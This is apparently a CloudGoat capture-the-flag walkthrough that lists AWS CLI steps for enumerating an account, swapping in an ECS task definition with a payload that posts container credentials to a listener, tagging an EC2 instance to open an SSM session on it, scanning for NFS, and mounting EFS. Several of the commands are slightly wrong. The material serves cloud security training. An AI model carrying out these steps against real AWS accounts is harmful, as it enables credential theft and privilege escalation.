1. Connect to the start ec2 "Ruse_Box" using the public IP and SSH key provided.

    `ssh -i cloudgoat ubuntu@<IP ADDRESS>`

2. Configure the role credentials 

    `aws configure --profile ruse`

3. List the privileges 
`aws iam list --profile ruse`

4. List ec2 instances 

    `aws ec2 describe-instances --profile ruse `

5. List all available ECS clusters 

    `aws ecs list-clusters --profile ruse`

6. List services in cloudgoat cluster

    `aws ecs list-services --cluster <CLUSTER ARN> --profile ruse`

7. Download task definition 

    `aws ecs describe-task-definition --task-definition <TASK_NAME>:<VERSION> --profile ruse > task_def.json `

8. Download template to register a new task

    `aws ecs register-task-definition --generate-cli-skeleton --profile ruse > task_template.json`

9. Now use task_def.json to fill out template.json with the desired payload. Reference our blog for details [here](https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/)

10. Now register the template to replace the currently running task.

    `register-task-definition --cli-input-json file://task_template.json  --profile ruse`

11. Wait for the task to run and POST the credentials to your listener

12. With the new creds add them to "ruse_box"

    `aws configure --profile ecs`

13. Modify admin ec2 tags

    `aws ec2 create-tags --resources <INSTANCE ID> --tags Key=StartSession,Value=true`

14. Using ecs creds start a session on admin ec2 

    `aws ssm start-session --target <INSTANCE ID> --profile ecs`

15. Looking at the ec2 instances we see the admin ec2 only has a single port open. We Nmap scan this port.

    `nmap -Pn -P 2049 --open 10.10.10.0/24 `

16. Mount discovered ec2 

    `cd /mnt`
`sudo mkdir /efs`
`sudo mount -t nfs4 -o nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport <IP ADDRESS OF EFS>:/ efs`